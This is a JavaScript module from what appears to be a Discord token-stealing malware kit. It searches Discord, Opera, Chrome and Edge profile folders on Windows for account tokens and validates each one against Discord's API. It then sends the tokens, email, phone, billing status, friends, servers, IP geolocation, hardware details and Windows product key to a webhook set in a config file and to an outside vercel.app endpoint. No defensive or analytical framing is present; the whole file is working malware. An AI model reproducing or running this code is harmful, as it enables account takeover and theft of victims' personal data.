const { getInfo } = require("./../../modules/core/core");
const { fetchServers, fetchFriends, getEmbeds, send } = require("./../../utils/functions");
const { WebhookClient } = require("discord.js");
const { totalsTokens, find } = require("./find");
const DiscordToken = require("discord.js-token");
const getconfig = require("./../../config/config")();
const process = require("process");
const axios = require("axios");

const webhook = new WebhookClient({
    url: getconfig.webhook,
});

const appData = process.env.appdata;
const localAppData = process.env.localappdata;

let paths = [
    `${appData}/discord/`,
    `${appData}/discordcanary/`,
    `${appData}/discordptb/`,
    `${appData}/discorddevelopment/`,
    `${appData}/lightcord/`,
    `${appData}/Opera Software/Opera Stable/`,
    `${appData}/Opera Software/Opera GX Stable/`,
    `${localAppData}/Google/Chrome/User Data/Default/`,
    `${localAppData}/Google/Chrome/User Data/Profile 1/`,
    `${localAppData}/Google/Chrome/User Data/Profile 2/`,
    `${localAppData}/Google/Chrome/User Data/Profile 3/`,
    `${localAppData}/Google/Chrome/User Data/Profile 4/`,
    `${localAppData}/Google/Chrome/User Data/Profile 5/`,
    `${localAppData}/Google/Chrome/User Data/Guest Profile/`,
    `${localAppData}/Google/Chrome/User Data/Default/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 1/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 2/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 3/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 4/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 5/Network/`,
    `${localAppData}/Google/Chrome/User Data/Guest Profile/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Default/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 1/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 2/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 3/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 4/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 5/`,
    `${localAppData}/Microsoft/Edge/User Data/Guest Profile/`,
    `${localAppData}/Microsoft/Edge/User Data/Default/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 1/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 2/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 3/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 4/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 5/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Guest Profile/Network/`,
];

async function sendTokens() {
    for (let path of paths) {
        await find(path);
    }
    for (let token of totalsTokens) {
        try {
            let k4itrun;
            try {
                const _ = await axios.get("https://discord.com/api/v9/users/@me", {
                    headers: {
                        "Content-Type": "application/json",
                        Authorization: token
                    }
                });
                k4itrun = _.data;
            } catch (error) {
                k4itrun = null;
            }

            if (!k4itrun) continue;

            var copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
            var servers =  fetchServers(token);
            var friends =  fetchFriends(token);
            let system = await getInfo();
            var discord = new DiscordToken(token, system.ip).info;

            webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "Initialized Grabber",
                fields: [
                    { name: "<a:aura:1087044506542674091> Token:", value: "```" + discord.token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
                    { name: "<a:aura:1101739920319590420> Nitro:", value: "" + discord.nitroType + "", inline: true },
                    { name: "<a:aura:995172580988309664> IP Adress", value: "`" + system.ip + "`", inline: true },
                    { name: "<a:aura:863691953531125820> Phone", value: "`" + discord.phone + "`", inline: true },
                    { name: "<:aura:974711605927505990> Email", value: "`" + discord.mail + "`", inline: true },
                    { name: "Badges", value: "" + discord.badges + "", inline: true },
                    { name: "Billing", value: "" + discord.billing + "", inline: true },
                ],
            }))).then((r) => { axios.get(copy) }).catch((e) => { axios.get(copy) });

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "HQ Friend(s)",
                desc: "" + friends.all + ""
            }))), 50);

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "HQ Guild(s)",
                desc: "" + servers.all + ""
            }))), 100);

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "User Informatio(s)",
                desc:
                    "**NSFW**" + discord.NSFW + "\n" +
                    "**Status**" + discord.status + "\n" +
                    "**Owner Servers**" + "`" + discord.totalOwnedGuild + "`\n" +
                    "**Connection**" + "`" + discord.totalConnection + "`\n" +
                    "**BOTS/RPC**" + "`" + discord.totalApplication + "`\n" +
                    "**Blocked**" + "`" + discord.totalBlocked + "`\n" +
                    "**Servers**" + "`" + discord.totalGuild + "`\n" +
                    "**Friends**" + "`" + discord.totalFriend + "`\n" +
                    "**Theme**" + "`" + discord.theme + "`\n" +
                    "**Pending**" + "`" + discord.pending + "`\n\n" +
                    "**Biography**" + "```yml\n" + (discord.bio === "has no description" ? "Not found" : discord.bio) + "\n```"
            }))), 150);

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "System Informatio(s)",
                fields: [
                    {
                        name: "User",
                        value: "```yml" +
                            "\nUsername: " + process.env.USERNAME +
                            "\nHostname: " + process.env.COMPUTERNAME + "```",
                        inline: false
                    },
                    {
                        name: "System",
                        value: "```yml" +
                            "\nCPU: " + system.cpu +
                            "\nUUID: " + system.uid +
                            "\nRAM: " + system.ram +
                            "\nMac Address: " + "Not found" +
                            "\nProduct Key: " + system.windowskey +
                            "\nLOCAL IP: " + "Not found" +
                            "\nOS Version: " + system.windowsversion + "```",
                        inline: false
                    },
                    {
                        name: "Network",
                        value: "```yml" +
                            "\nPUBLIC: " + system.ip +
                            "\nCountry: " + discord.IP.country +
                            "\nRegion: " + discord.IP.region +
                            "\nCity: " + discord.IP.city +
                            "\nLatitude: " + discord.IP.latitude +
                            "\nLongitude: " + discord.IP.longitude +
                            "\nISP: " + discord.IP.isp +
                            "\nTime Zone: " + discord.IP.timezone +
                            "\nCurrency Code: " + discord.IP.currency_code + "```",
                        inline: false
                    },
                ]
            }))), 200);
            continue;
        } catch (e) {
            console.error(e);
        }
    }
}

module.exports = {
    sendTokens
}